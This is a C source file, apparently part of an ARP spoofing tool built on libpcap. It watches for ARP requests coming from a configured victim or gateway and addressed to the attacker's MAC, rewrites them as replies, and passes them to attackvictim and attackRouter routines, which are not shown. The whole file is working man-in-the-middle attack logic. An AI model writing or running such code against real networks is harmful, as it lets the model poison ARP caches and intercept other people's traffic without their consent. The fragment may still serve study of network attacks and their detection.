#include "myHeader.h"

int checkARP(pcap_t* handle, const u_char* packet)
{
	PARP_PACKET arpPacket;
	arpPacket = (PARP_PACKET)packet;
	u_short ether_type = ntohs(arpPacket->ethernet.etherType);
	if (ether_type == ARP)
	{
		u_short OpCode = ntohs(arpPacket->arp.Opcode);
		if (OpCode == REQUEST)
		{
			if (checkVictim(&(arpPacket->ethernet)))
			{
				arpPacket->arp.Opcode = ntohs(REPLY);
				printf("attack victim\n");
				attackvictim(handle, arpPacket);
			}
			else if (checkGateWay(&(arpPacket->ethernet)))
			{
				arpPacket->arp.Opcode = ntohs(REPLY);
				printf("attack router\n");
				attackRouter(handle, arpPacket);
			}
		}
		return 1;
	}
	return 0;
}
int checkVictim(PETHERNET_HEADER eh)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}
int checkGateWay(PETHERNET_HEADER eh)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}